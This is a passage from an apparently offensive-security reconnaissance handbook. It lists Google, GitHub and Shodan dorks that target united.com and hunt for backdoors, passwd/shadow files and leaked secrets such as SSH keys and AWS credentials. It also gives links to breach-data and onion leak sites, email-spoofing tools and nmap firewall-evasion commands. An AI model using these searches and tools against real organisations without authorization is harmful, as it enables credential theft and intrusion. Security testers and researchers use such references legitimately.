https://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf
# Sub-subdomains
https://www.google.com/search?q=site%3A*.*.united.com
# Jenkins
https://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22
# Traefik
https://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22
# Cloud buckets S3/GCP
https://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22
# SQL errors
https://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22
# Exposed documents
https://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv
# Wordpress files
https://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes
# Apache Struts RCE
https://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado
# GitLab/GitHub/Bitbucket
https://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22
# Subdomains
https://www.google.com/search?q=site%3A*.united.com
# Stackoverflow
https://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22
# PHP errors
https://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22
</code></pre>
<h3 id="github"><a class="header" href="#github">GitHub</a></h3>
<h4 id="tools-1"><a class="header" href="#tools-1">Tools</a></h4>
<pre><code>#https://github.com/obheda12/GitDorker
python3 GitDorker.py -tf ~/Tools/.github_tokens -q united.com -p -ri -d Dorks/medium_dorks.txt
</code></pre>
<h4 id="dorks-2"><a class="header" href="#dorks-2">Dorks</a></h4>
<pre><code class="language-bash">".mlab.com password"
"access_key"
"access_token"
"amazonaws"
"api.googlemaps AIza"
"api_key"
"api_secret"
"apidocs"
"apikey"
"apiSecret"
"app_key"
"app_secret"
"appkey"
"appkeysecret"
"application_key"
"appsecret"
"appspot"
"auth"
"auth_token"
"authorizationToken"
"aws_access"
"aws_access_key_id"
"aws_key"
"aws_secret"
"aws_token"
"AWSSecretKey"
"bashrc password"
"bucket_password"
"client_secret"
"cloudfront"
"codecov_token"
"config"
"conn.login"
"connectionstring"
"consumer_key"
"credentials"
"database_password"
"db_password"
"db_username"
"dbpasswd"
"dbpassword"
"dbuser"
"dot-files"
"dotfiles"
"encryption_key"
"fabricApiSecret"
"fb_secret"
"firebase"
"ftp"
"gh_token"
"github_key"
"github_token"
"gitlab"
"gmail_password"
"gmail_username"
"herokuapp"
"internal"
"irc_pass"
"JEKYLL_GITHUB_TOKEN"
"key"
"keyPassword"
"ldap_password"
"ldap_username"
"login"
"mailchimp"
"mailgun"
"master_key"
"mydotfiles"
"mysql"
"node_env"
"npmrc _auth"
"oauth_token"
"pass"
"passwd"
"password"
"passwords"
"pem private"
"preprod"
"private_key"
"prod"
"pwd"
"pwds"
"rds.amazonaws.com password"
"redis_password"
"root_password"
"secret"
"secret.password"
"secret_access_key"
"secret_key"
"secret_token"
"secrets"
"secure"
"security_credentials"
"send.keys"
"send_keys"
"sendkeys"
"SF_USERNAME salesforce"
"sf_username"
"site.com" FIREBASE_API_JSON=
"site.com" vim_settings.xml
"slack_api"
"slack_token"
"sql_password"
"ssh"
"ssh2_auth_password"
"sshpass"
"staging"
"stg"
"storePassword"
"stripe"
"swagger"
"testuser"
"token"
"x-api-key"
"xoxb "
"xoxp"
Jenkins
OTP
oauth
authoriztion
password
pwd
ftp
dotfiles
JDBC
key-keys
send_key-keys
send,key-keys
token
user
login-singin
passkey-passkeys
pass
secret
SecretAccessKey
app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
credentials
config
security_credentials
connectionstring
ssh2_auth_password
DB_PASSWORD
[WFClient] Password= extension:ica
access_key
bucket_password
dbpassword
dbuser
extension:avastlic "support.avast.com"
extension:bat
extension:cfg
extension:env
extension:exs
extension:ini
extension:json api.forecast.io
extension:json googleusercontent client_secret
extension:json mongolab.com
extension:pem
extension:pem private
extension:ppk
extension:ppk private
extension:properties
extension:sh
extension:sls
extension:sql
extension:sql mysql dump
extension:sql mysql dump password
extension:yaml mongolab.com
extension:zsh
filename:.bash_history
filename:.bash_history DOMAIN-NAME
filename:.bash_profile aws
filename:.bashrc mailchimp
filename:.bashrc password
filename:.cshrc
filename:.dockercfg auth
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.esmtprc password
filename:.ftpconfig
filename:.git-credentials
filename:.history
filename:.htpasswd
filename:.netrc password
filename:.npmrc _auth
filename:.pgpass
filename:.remote-sync.json
filename:.s3cfg
filename:.sh_history
filename:.tugboat NOT _tugboat
filename:_netrc password
filename:apikey
filename:bash
filename:bash_history
filename:bash_profile
filename:bashrc
filename:beanstalkd.yml
filename:CCCam.cfg
filename:composer.json
filename:config
filename:config irc_pass
filename:config.json auths
filename:config.php dbpasswd
filename:configuration.php JConfig password
filename:connections
filename:connections.xml
filename:constants
filename:credentials
filename:credentials aws_access_key_id
filename:cshrc
filename:database
filename:dbeaver-data-sources.xml
filename:deployment-config.json
filename:dhcpd.conf
filename:dockercfg
filename:environment
filename:express.conf
filename:express.conf path:.openshift
filename:filezilla.xml
filename:filezilla.xml Pass
filename:git-credentials
filename:gitconfig
filename:global
filename:history
filename:htpasswd
filename:hub oauth_token
filename:id_dsa
filename:id_rsa
filename:id_rsa or filename:id_dsa
filename:idea14.key
filename:known_hosts
filename:logins.json
filename:makefile
filename:master.key path:config
filename:netrc
filename:npmrc
filename:pass
filename:passwd path:etc
filename:pgpass
filename:prod.exs
filename:prod.exs NOT prod.secret.exs
filename:prod.secret.exs
filename:proftpdpasswd
filename:recentservers.xml
filename:recentservers.xml Pass
filename:robomongo.json
filename:s3cfg
filename:secrets.yml password
filename:server.cfg
filename:server.cfg rcon password
filename:settings
filename:settings.py SECRET_KEY
filename:sftp-config.json
filename:sftp-config.json password
filename:sftp.json path:.vscode
filename:shadow
filename:shadow path:etc
filename:spec
filename:sshd_config
filename:token
filename:tugboat
filename:ventrilo_srv.ini
filename:WebServers.xml
filename:wp-config
filename:wp-config.php
filename:zhrc
HEROKU_API_KEY language:json
HEROKU_API_KEY language:shell
HOMEBREW_GITHUB_API_TOKEN language:shell
jsforce extension:js conn.login
language:yaml -filename:travis
msg nickserv identify filename:config
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "bucket_name"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_BUCKET"
org:Target "S3_ENDPOINT"
org:Target "S3_SECRET_ACCESS_KEY"
password
path:sites databases password
private -language:java
PT_TOKEN language:bash
redis_password
root_password
secret_access_key
SECRET_KEY_BASE=
shodan_api_key language:python
WORDPRESS_DB_PASSWORD=
xoxp OR xoxb OR xoxa
s3.yml
.exs
beanstalkd.yml
deploy.rake
.sls
— — — — — — — — — — — — — — — — — — -BASH — — — — — — — — — —
language:bash password
language:bash pwd
language:bash ftp
language:bash dotfiles
language:bash JDBC
language:bash key-keys
language:bash send_key-keys
language:bash send,key-keys
language:bash token
language:bash user
language:bash login-singin
language:bash passkey-passkeys
language:bash pass
language:bash secret
language:bash credentials
language:bash config
language:bash security_credentials
language:bash connectionstring
language:bash ssh2_auth_password
— — — — — — — — — — — — — — — — — — -PYTHON — — — — — — — — —
language:python password
language:python pwd
language:python ftp
language:python dotfiles
language:python JDBC
language:python key-keys
language:python send_key-keys
language:python send,key-keys
language:python token
language:python user
language:python login-singin
language:python passkey-passkeys
language:python pass
language:python secret
language:python credentials
language:python config
language:python security_credentials
language:python connectionstring
language:python ssh2_auth_password

org:facebookresearch https://
org:facebookresearch http://
org:facebookresearch ldap
org:facebookresearch ftp
org:facebookresearch sftp
org:facebookresearch host:
org:facebookresearch login

</code></pre>
<h3 id="shodan"><a class="header" href="#shodan">Shodan</a></h3>
<h4 id="dorks-3"><a class="header" href="#dorks-3">Dorks</a></h4>
<pre><code class="language-bash">port:"9200" elastic
product:"docker"
product:"kubernetes"
hostname:"target.com"
host:"10.10.10.10"
# Spring boot servers, look for /env or /heapdump
org:YOUR_TAGET http.favicon.hash:116323821 
</code></pre>
<h2 id="asncidr-tools"><a class="header" href="#asncidr-tools">ASN/CIDR Tools</a></h2>
<pre><code class="language-bash"># Company string name to CIDR
# https://github.com/dhn/spk
spk -json -s "Google"

# Versatile tool with multiple input options and output formats
# https://github.com/projectdiscovery/asnmap
asnmap -i 1.3.3.7 -org GOOGLE -d facebook.com,twitter.com -a AS394161

# https://github.com/nitefood/asn
asn -n 8.8.8.8

# https://github.com/j3ssie/metabigor
echo "company" | metabigor net --org
echo "ASN1111" | metabigor net --asn

# https://github.com/yassineaboukir/Asnlookup
python asnlookup.py -m -o &lt;Organization&gt;

# https://github.com/harleo/asnip
asnip -t domain.com -p

# https://github.com/projectdiscovery/mapcidr
echo 10.10.10.0/24 | mapcidr

# https://github.com/eslam3kl/3klector
python 3klector.py -t company

# https://github.com/SpiderLabs/HostHunter
python3 hosthunter.py targets.txt

# Website (with API)
https://asnlookup.com/
</code></pre>
<h2 id="credentials-leaks"><a class="header" href="#credentials-leaks">Credentials leaks</a></h2>
<pre><code class="language-bash"># pwndb
# https://github.com/davidtavarez/pwndb
python3 pwndb.py --target asd@asd.com

# Websites
https://link-base.org/index.php
http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion/
http://pwndb2am4tzkvold.onion
https://weleakinfo.to/
https://www.dehashed.com/search?query=
https://haveibeenpwned.com
https://breachchecker.com
https://vigilante.pw/
https://leak.sx/
https://intelx.io
https://search.illicit.services/
https://breachdirectory.org/

breachdirectory.org + (hashes.com || md5decrypt.net || crackstation.net)# Nice combination

# Check hashes with this tool
https://github.com/jackrendor/jhf
</code></pre>
<h2 id="email-tools"><a class="header" href="#email-tools">Email tools</a></h2>
<pre><code class="language-bash"># https://github.com/SimplySecurity/SimplyEmail
./SimplyEmail.py

pip3 install mailspoof
sudo mailspoof -d domain.com

# Test email spoof
https://emkei.cz/

# Find emails in an org
https://hunter.io
https://snov.io/email-finder
https://app.snov.io/domain-search
https://hunter.io/

# https://github.com/sham00n/buster
buster -e target@example.com

# https://github.com/m4ll0k/Infoga
python infoga.py

# https://github.com/martinvigo/email2phonenumber
python email2phonenumber.py scrape -e target@email.com

# https://github.com/jkakavas/creepy/

# https://github.com/Josue87/EmailFinder
emailfinder -d domain.com

# https://github.com/laramies/theHarvester
python3 theHarvester.py -d domain.com -b "linkedin"
</code></pre>
<h2 id="git-tools"><a class="header" href="#git-tools">GIT tools</a></h2>
<pre><code class="language-bash"># https://github.com/obheda12/GitDorker
python3 GitDorker.py -tf TOKENSFILE -q tesla.com -d dorks/DORKFILE -o target

# https://github.com/dxa4481/truffleHog
trufflehog https://github.com/Plazmaz/leaky-repo
trufflehog --regex --entropy=False https://github.com/Plazmaz/leaky-repo

# https://github.com/eth0izzle/shhgit
shhgit --search-query AWS_ACCESS_KEY_ID=AKIA

# https://github.com/d1vious/git-wild-hunt
python git-wild-hunt.py -s "extension:json filename:creds language:JSON"

# https://shhgit.darkport.co.uk/

# GitLab (API token required)
# https://github.com/codeEmitter/token-hunter
./token-hunter.py -g 123456
</code></pre>
<h2 id="metadata"><a class="header" href="#metadata">Metadata</a></h2>
<pre><code class="language-bash"># https://github.com/Josue87/MetaFinder
metafinder -d "domain.com" -l 10 -go -bi -ba -o united
</code></pre>
<h2 id="social-media"><a class="header" href="#social-media">Social Media</a></h2>
<pre><code class="language-bash"># Twitter
# https://github.com/twintproject/twint
twint -u username

# Google account
# https://github.com/mxrch/ghunt
python hunt.py myemail@gmail.com

# Instagram
# https://github.com/th3unkn0n/osi.ig
python3 main.py -u username

# Public GDrive docs
https://www.dedigger.com/#gsc.tab=0

# Websites
emailrep.io # Accounts registered by email
tinfoleak.com # Twitter
mostwantedhf.info # Skype
searchmy.bio # Instagram
search.carrot2.org # Results grouped by topic
boardreader.com # forums
searchcode.com # search by code in repositories
swisscows.com # semantic search engine
publicwww.com # search by source page code
psbdmp.ws # search in pastebin
kribrum.io # social-media search engine
whatsmyname.app
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="root-domains"><a class="header" href="#root-domains">Root domains</a></h1>
<h3 id="basic"><a class="header" href="#basic">Basic</a></h3>
<pre><code class="language-bash"># https://github.com/OWASP/Amass 
amass intel -d domain.com -whois 

# Search on Google
https://google.com/search?q=united+airlines 

# Analyze owners on domainbigdata
https://iqwhois.com/
</code></pre>
<h3 id="reverse-whois"><a class="header" href="#reverse-whois">Reverse whois</a></h3>
<pre><code>https://viewdns.info/reversewhois/?q=United+Airlines
https://tools.whoisxmlapi.com/reverse-whois-search
</code></pre>
<h3 id="asn"><a class="header" href="#asn">ASN</a></h3>
<pre><code class="language-bash">https://bgp.he.net/search?search%5Bsearch%5D=united+airlines&amp;commit=Search 
whois -h whois.radb.net -- '-i origin AS11535' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq 
whois -h whois.radb.net -- '-i origin AS20461' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq | mapcidr -silent | dnsx -ptr -resp-only -retry 3 -silent
</code></pre>
<h3 id="favicon"><a class="header" href="#favicon">Favicon</a></h3>
<pre><code class="language-bash"># https://github.com/pielco11/fav-up
python3 favUp.py -ff ~/favicon.ico --shodan-cli 

# https://github.com/devanshbatham/FavFreak
cat urls.txt | python3 favfreak.py 

# https://faviconhasher.herokuapp.com/

# https://www.shodan.io/search?query=http.favicon.hash%3A-382492124

# https://github.com/edoardottt/favirecon
favirecon -u https://target.com/ -v
</code></pre>
<h3 id="google-analytics-id"><a class="header" href="#google-analytics-id">Google Analytics ID</a></h3>
<pre><code class="language-bash">https://builtwith.com/relationships/united.com
https://builtwith.com/relationships/tag/UA-29214177
https://api.hackertarget.com/analyticslookup/?q=united.com
https://api.hackertarget.com/analyticslookup/?q=UA-16316580
</code></pre>
<h3 id="dns-manual-recon"><a class="header" href="#dns-manual-recon">DNS manual recon</a></h3>
<pre><code class="language-bash">dnsrecon -d www.example.com -a 
dnsrecon -d www.example.com -t axfr
dnsrecon -d 
dnsrecon -d www.example.com -D  -t brt

dig www.example.com + short
dig www.example.com MX
dig www.example.com NS
dig www.example.com&gt; SOA
dig www.example.com ANY +noall +answer
dig -x www.example.com
dig -4 www.example.com (For IPv4)
dig -6 www.example.com (For IPv6)
dig www.example.com mx +noall +answer example.com ns +noall +answer
dig -t AXFR www.example.com
dig axfr @10.11.1.111 example.box

dnsenum 10.11.1.111
</code></pre>
<h3 id="reverse-ip-search"><a class="header" href="#reverse-ip-search">Reverse IP search</a></h3>
<pre><code class="language-bash"># Get domain from IP
# https://reverse-ip.whoisxmlapi.com/
# https://github.com/projectdiscovery/dnsx
cat ips.txt | dnsx -ptr -resp-only -silent -retry 3
</code></pre>
<h3 id="tld-bruteforcing"><a class="header" href="#tld-bruteforcing">TLD bruteforcing</a></h3>
<pre><code># TLD bruteforcing tool
https://github.com/Sybil-Scan/TLDbrute
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subdomain-enum"><a class="header" href="#subdomain-enum">Subdomain Enum</a></h1>
<h2 id="passive-sources"><a class="header" href="#passive-sources">Passive sources</a></h2>
<pre><code class="language-bash"># https://github.com/OWASP/Amass
# https://github.com/OWASP/Amass/blob/master/examples/config.ini
amass enum -passive -d domain.com

# https://github.com/projectdiscovery/subfinder
# https://github.com/projectdiscovery/subfinder#post-installation-instructions
subfinder -d domain.com -all -silent

# https://github.com/tomnomnom/assetfinder
assetfinder example.com

# https://github.com/tomnomnom/waybackurls
# https://github.com/tomnomnom/unfurl
echo domain.com | waybackurls | unfurl -u domains

# https://github.com/lc/gau
# https://github.com/tomnomnom/unfurl
gau --subs example.com | unfurl -u domains

## Cert Transparency
# https://certificate.transparency.dev/
# https://crt.sh/
# https://github.com/glebarez/cero
cero example.com
# https://github.com/UnaPibaGeek/ctfr
python3 ctfr.py -d domain.com

# https://github.com/gwen001/github-subdomains
github-subdomains -d example.com -t tokens.txt -o output.txt

# https://github.com/christophetd/censys-subdomain-finder
python3 censys-subdomain-finder.py example.com

# https://github.com/SmoZy92/Shodomain
python shodomain.py &lt;SHODAN-API-KEY&gt; example.com

# https://github.com/Cgboal/SonarSearch
crobat -s example.com
</code></pre>
<h2 id="active-dns-resolution"><a class="header" href="#active-dns-resolution">Active DNS resolution</a></h2>
<pre><code class="language-bash"># Generate custom resolvers list, always
# https://github.com/vortexau/dnsvalidator
dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 200

# https://github.com/d3mondev/puredns
puredns resolve subdomains.txt -r ~/Tools/resolvers.txt

## BF
# https://github.com/d3mondev/puredns
puredns bruteforce ~/Tools/subdomains.txt united.com -r ~/Tools/resolvers.txt

# https://github.com/projectdiscovery/shuffledns
shuffledns -d example.com -list example-subdomains.txt -r resolvers.txt
</code></pre>
<h2 id="alterations-and-permutations"><a class="header" href="#alterations-and-permutations">Alterations and permutations</a></h2>
<pre><code class="language-bash">#https://github.com/Josue87/gotator
gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md
</code></pre>
<h2 id="crawling"><a class="header" href="#crawling">Crawling</a></h2>
<pre><code class="language-bash"># 1st resolve subdomains on valid websites
# https://github.com/projectdiscovery/httpx
cat subdomains.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt
# Clean output
cat webs_info.txt | cut -d ' ' -f1 | grep ".domain.com" | sort -u &gt; websites.txt
# Crawl them
# https://github.com/jaeles-project/gospider
gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r &gt; urls.txt
# Clean output
# https://github.com/tomnomnom/unfurl
cat urls.txt | sed '/^.\{2048\}./d' | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep ".domain.com"
</code></pre>
<h2 id="dns-records"><a class="header" href="#dns-records">DNS records</a></h2>
<pre><code class="language-bash"># https://github.com/projectdiscovery/dnsx
dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt
</code></pre>
<h2 id="dns-wordlists"><a class="header" href="#dns-wordlists">DNS wordlists</a></h2>
<pre><code># https://gist.githubusercontent.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw
# https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt
# https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a
</code></pre>
<h2 id="other-techniques"><a class="header" href="#other-techniques">Other techniques</a></h2>
<h3 id="google-analytics-id-1"><a class="header" href="#google-analytics-id-1">Google Analytics ID</a></h3>
<pre><code class="language-bash"># https://github.com/Josue87/AnalyticsRelationships
cat subdomains.txt | analyticsrelationships
</code></pre>
<h3 id="subdomain-discovery-with-burp"><a class="header" href="#subdomain-discovery-with-burp">Subdomain discovery with Burp</a></h3>
<p>Navigate through target main website with Burp:</p>
<ul>
<li>Without passive scanner</li>
<li>Set forms auto submit</li>
<li>Scope in advanced, any protocol and one keyword ("tesla")</li>
<li>Last step, select all sitemap, Engagement Tools -&gt; Analyze target</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subdomain-takeover"><a class="header" href="#subdomain-takeover">Subdomain Takeover</a></h1>
<h2 id="explanation"><a class="header" href="#explanation">Explanation</a></h2>
<ol>
<li>Domain name (sub.example.com) uses a CNAME record for another domain (sub.example.com CNAME anotherdomain.com). </li>
<li>At some point, anotherdomain.com expires and is available for anyone's registration. </li>
<li>Since the CNAME record is not removed from the DNS zone of example.com, anyone who records anotherdomain.com has full control over sub.example.com until the DNS record is present.</li>
</ol>
<h2 id="resources"><a class="header" href="#resources">Resources</a></h2>
<p>https://0xpatrik.com/takeover-proofs/</p>
<p>https://github.com/EdOverflow/can-i-take-over-xyz</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="webs-recon"><a class="header" href="#webs-recon">Webs recon</a></h1>
<h2 id="resolution"><a class="header" href="#resolution">Resolution</a></h2>
<pre><code class="language-bash"># https://github.com/projectdiscovery/httpx
cat subdomains/subdomains.txt | httpx -follow-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -no-color -o websites.txt
</code></pre>
<h2 id="waf-checks"><a class="header" href="#waf-checks">WAF Checks</a></h2>
<pre><code class="language-bash"># https://github.com/EnableSecurity/wafw00f 
wafw00f -i websites.txt

# IP Wafs/CDN lists
https://github.com/MISP/misp-warninglists
</code></pre>
<h2 id="cms"><a class="header" href="#cms">CMS</a></h2>
<pre><code class="language-bash"># https://github.com/Tuhinshubhra/CMSeeK 
tr '\n' ',' &lt; websites.txt &gt; cms_test.txt 
python3 cmseek.py -l cms_test.txt --batch -r
</code></pre>
<h2 id="web-screenshot"><a class="header" href="#web-screenshot">Web screenshot</a></h2>
<pre><code class="language-bash"># https://github.com/sensepost/gowitness
gowitness file -f websites.txt 
gowitness report serve -D gowitness.sqlite3
</code></pre>
<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
<pre><code class="language-bash"># https://github.com/ffuf/ffuf
ffuf -mc all -fc 404 -ac -sf -s -w wordlist.txt -u https://www.domain.com/FUZZ
</code></pre>
<h2 id="urls"><a class="header" href="#urls"> URLs</a></h2>
<h3 id="url-extraction"><a class="header" href="#url-extraction">URL extraction</a></h3>
<pre><code class="language-bash"># https://github.com/jaeles-project/gospider
gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r &gt; urls.txt

# https://github.com/lc/gau
 cat websites.txt | gau -subs 
 
 # https://github.com/tomnomnom/waybackurls 
 cat websites.txt | waybackurls 
 
 # https://github.com/gwen001/github-endpoints 
 github-endpoints -q -k -d united.com -t tokens_github.txt 
 
 # https://github.com/Josue87/roboxtractor 
 cat webs.txt | roboxtractor -m 1 -wb
</code></pre>
<h3 id="filtering"><a class="header" href="#filtering">Filtering</a></h3>
<pre><code class="language-bash"># https://github.com/tomnomnom/qsreplace
cat urls.txt | qsreplace -a

# https://github.com/s0md3v/uro 
cat urls.txt | uro
</code></pre>
<p>  Patterns</p>
<pre><code class="language-bash"># https://github.com/tomnomnom/gf 
# https://github.com/1ndianl33t/Gf-Patterns 
gf sqli urls.txt
</code></pre>
<h3 id="js"><a class="header" href="#js">JS</a></h3>
<pre><code class="language-bash"># https://github.com/w9w/JSA 
cat urls.txt | python3 jsa.py 

# https://github.com/lc/subjs 
cat js.txt | subjs | httpx 

# https://github.com/GerbenJavado/LinkFinder 
python3 linkfinder.py -d -i https://domain.com/whatever.js -o cli
</code></pre>
<h3 id="wordlists-generation"><a class="header" href="#wordlists-generation">Wordlists generation</a></h3>
<pre><code class="language-bash"># https://github.com/tomnomnom/unfurl 
cat urls.txt | unfurl -u keys 
cat urls.txt | unfurl -u values
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-scanning"><a class="header" href="#network-scanning">Network Scanning</a></h1>
<h2 id="ip-resolution"><a class="header" href="#ip-resolution">IP resolution</a></h2>
<pre><code class="language-bash"># https://github.com/Josue87/resolveDomains
resolveDomains -d subdomains.txt
</code></pre>
<h2 id="netdiscover"><a class="header" href="#netdiscover">Netdiscover</a></h2>
<pre><code class="language-bash">netdiscover -i eth0
netdiscover -r 10.11.1.1/24
</code></pre>
<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
<pre><code class="language-bash">nmap -sn 10.11.1.1/24
nmap -sn 10.11.1.1-253
nmap -sn 10.11.1.*
</code></pre>
<h2 id="netbios"><a class="header" href="#netbios">NetBios</a></h2>
<pre><code class="language-bash">nbtscan -r 10.11.1.1/24
</code></pre>
<h2 id="ping-sweep---bash"><a class="header" href="#ping-sweep---bash">Ping Sweep - Bash</a></h2>
<pre><code class="language-bash">for i in {1..254} ;do (ping -c 1 172.21.10.$i | grep "bytes from" &amp;) ;done
</code></pre>
<h2 id="ping-sweep---windows"><a class="header" href="#ping-sweep---windows">Ping Sweep - Windows</a></h2>
<pre><code class="language-bash">for /L %i in (1,1,255) do @ping -n 1 -w 200 172.21.10.%i &gt; nul &amp;&amp; echo 192.168.1.%i is up.
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="host-scanning"><a class="header" href="#host-scanning">Host Scanning</a></h1>
<h2 id="nmap-1"><a class="header" href="#nmap-1">nmap</a></h2>
<pre><code class="language-bash"># Fast simple scan
nmap 10.11.1.111

# Nmap ultra fast
nmap 10.11.1.111 --max-retries 1 --min-rate 1000

# Get open ports
nmap -p - -Pn -n 10.10.10.10

# Comprehensive fast and accurate
nmap --top-ports 200 -sV -n --max-retries 2 -Pn --open -iL ips.txt -oA portscan_active

# Get sV from ports
nmap -pXX,XX,XX,XX,XX -Pn -sV -n 10.10.10.10

# Full complete slow scan with output
nmap -v -A -p- -Pn --script vuln -oA full 10.11.1.111

# Network filtering evasion
nmap --source-port 53 -p 5555 10.11.1.111
    # If work, set IPTABLES to bind this port
    iptables -t nat -A POSTROUTING -d 10.11.1.111 -p tcp -j SNAT --to :53

# Scan for UDP
nmap 10.11.1.111 -sU
nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 10.11.1.111

# FW evasion
nmap -f &lt;IP&gt;
nmap --mtu 24 &lt;IP&gt;
nmap --data-length 30 &lt;IP&gt;
nmap --source-port 53 &lt;IP&gt;

# Nmap better speed flags
--max-rtt-timeout: Time response per probe
--script-timeout: Time response per script
--host-timeout: Time response for host
--open: Avoid detection if filtered or closed
--min-rate
</code></pre>
<h2 id="shodan-1"><a class="header" href="#shodan-1">shodan</a></h2>
<pre><code class="language-bash"># https://cli.shodan.io/
shodan host 151.101.1.68
</code></pre>
<p><img src="recon/../.gitbook/assets/image%20(2).png" alt="" /></p>
<p><img src="recon/../.gitbook/assets/image%20(45).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="packet-scanning"><a class="header" href="#packet-scanning">Packet Scanning</a></h1>
<h2 id="tcpdump"><a class="header" href="#tcpdump">tcpdump</a></h2>
<pre><code class="language-bash">tcpdump -i eth0
tcpdump -c -i eth0
tcpdump -A -i eth0
tcpdump -w 0001.pcap -i eth0
tcpdump -r 0001.pcap
tcpdump -n -i eth0
tcpdump -i eth0 port 22
tcpdump -i eth0 -src 172.21.10.X
tcpdump -i eth0 -dst 172.21.10.X

# Online service
https://packettotal.com/
</code></pre>
<h2 id="packet-strings-analyzer"><a class="header" href="#packet-strings-analyzer">Packet strings analyzer</a></h2>
<pre><code class="language-bash"># https://github.com/lgandx/PCredz
./Pcredz -f file-to-parse.pcap
./Pcredz -d /tmp/pcap-directory-to-parse/
./Pcredz -i eth0 -v
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="files"><a class="header" href="#files">Files</a></h1>
<h3 id="common"><a class="header" href="#common">Common</a></h3>
<pre><code class="language-bash"># Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe

# Compressed files
fcrackzip file.zip
# https://github.com/priyankvadaliya/Zip-Cracker-
python zipcracker.py -f testfile.zip -d passwords.txt
python zipcracker.py -f testfile.zip -d passwords.txt -o extractdir

# Office documents
https://github.com/assafmo/xioc

# Zip files in website
pip install remotezip
# list contents of a remote zip file
remotezip -l "http://site/bigfile.zip"
# extract file.txt from a remote zip file
remotezip "http://site/bigfile.zip" "file.txt"

# Grep inside any files
# https://github.com/phiresky/ripgrep-all
rga "whatever" folder/
</code></pre>
<h3 id="disk-files"><a class="header" href="#disk-files">Disk files</a></h3>
<pre><code class="language-bash"># guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
